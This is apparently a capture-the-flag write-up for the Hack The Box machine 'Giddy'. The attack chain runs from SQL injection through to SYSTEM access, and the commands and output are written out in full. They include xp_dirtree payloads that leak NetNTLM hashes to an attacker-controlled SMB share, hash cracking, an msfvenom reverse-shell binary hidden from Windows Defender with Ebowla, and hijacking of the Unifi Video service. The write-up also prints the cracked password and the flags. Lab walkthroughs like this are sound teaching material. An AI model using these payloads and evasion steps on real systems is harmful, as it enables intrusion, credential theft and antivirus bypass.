**Skills Required**
● Basic knowledge of SQL injection
techniques
● Basic knowledge of Windows
**Skills Learned**
● Using xp_dirtree to leak the SQL Server
service account NetNTLM hash
● Identification of installed programs via
Windows Registry enumeration
● Reverse shell payload creation

Port 80 (http)
port 443 (https)
port 5985(winrm)

With port 80 open, let's take a look at the website in the browser, 
There is only a picture, nothing interesting, so we could try https (443) but it's the same thing.

Let's fuzz this website with the Wfuzz tool.

``` bash
wfuzz -c --hc=404 -w /user/share/seclist/..... http:/10.10.10.104/FUZZ
```

Wfuzz found two routes called "remote" and "mvc", let's chek them on the website.
"Remote" is a login panel, and "mvc" is a website that is not finished, but has some information; i'ts like a marketplace.

In this type of marketplace it is common to find  the url the parameter "ID" so I tried some payloads for sql injection, but it seems not be vulnerable. However, I got an error that showed me a Username, so I save it.  In windows there is a concept  we can try to exploit to steal NetNTLM hash from the user "xp_dirtree sql"  https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

To do this You should start a **SMB server** to capture the hash used in the authentication

``` bash
id=32; EXEC MASTER.sys.xp_dirtree '\\<attacker_IP>\any\thing'
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\share\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash

❯ sudo smbserver.py share ./ -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.104,49704)
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User GIDDY\Stacy authenticated successfully
[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:bdff9aca23108d45c047a166ab583683:01010000000000008028cda705edd901bbb40e736f58adb500000000010010006d0044004300570069006d0074006100030010006d0044004300570069006d00740061000200100079004c004b00480045004700630072000400100079004c004b0048004500470063007200070008008028cda705edd90106000400020000000800300030000000000000000000000000300000854cbb70e19a1dccbf562111b06affdf8f28608c7f8ee554fb53d14e855ac5500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
``` 

In this way I obtained the NetNTLM hash for the user Stacy, I need to crack it using John
```
❯ john --wordlist=~/Documents/wordlist/rockyou.txt hash
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)
1g 0:00:00:01 DONE (2023-09-21 22:35) 0.6896g/s 1855Kp/s 1855Kc/s 1855KC/s xamtrex..x215534x
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Whit these credentials I can access  the victim machine using the evil-winrm tool
```
evil-winrm -i 10.10.10.104 -u 'stacy' -p 'xNnWo6272k7x'
```

Now I need to escalate privileges

There is a binary called "unifi video"
looking for a vulnerability with searchsploit I found an eexploit. To exploit it I need to do the following:

```
#I have write privileges in this directory
cd C:\ProgramData\unifi-video

# If I can stop and start the Unifi Video service, and when the service starts (the admin starts the service), it executes a binary, I would attempt to copy an arbitrary binary with malicious code. Then, when the service starts, my binary would be executed.

# The windows defender on the victim machine, doesn't allow me to execute my malicius binary, so I need to bypass this problem
# use Ebowla -> clone the repository https://github.com/Genetic-Malware/Ebowla
# create the malicius binary with msfvenom 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f exe -o taskkill.exe

#mv the taskkill.exe to the ebowla directory
# edit the genetic.config file -> select output_type = GO -> payload_type = EXE
# [[ENV_VAR]] 
# username = ''
# compoutername = 'Giddy'
# userdomain = ''
# now exuecute ebowla
python ebowla.py taskkill.exe genetic.config
#now I need to compile the .go file 
❯ ./build_x64_go.sh output/go_symmetric_taskkill.exe.go taskkill.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy taskkill.exe to output
[*] Cleaning up
[*] Done

#now upload the final binary to the victim machine 
```

Now I need to stop  the service on the victim machine

``` powershell
# On my machine-> nc -nlvp 1234

# list the existing services on the victim machine
cd HKLM:SYSTEM\CurrentControlSet\Services  -> UniFiVideoService
*Evil-WinRM* PS C:\ProgramData\unifi-video> cmd /c sc stop UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0xbb8
```

Now I have gaine access as "nt authority\system" and i can finish this machine from hack the box.
user flag > c7a8f1ee50e00285f08f1b52ec5a76ba
root flag > dd23753bd49ff3f59cea11032a5c2529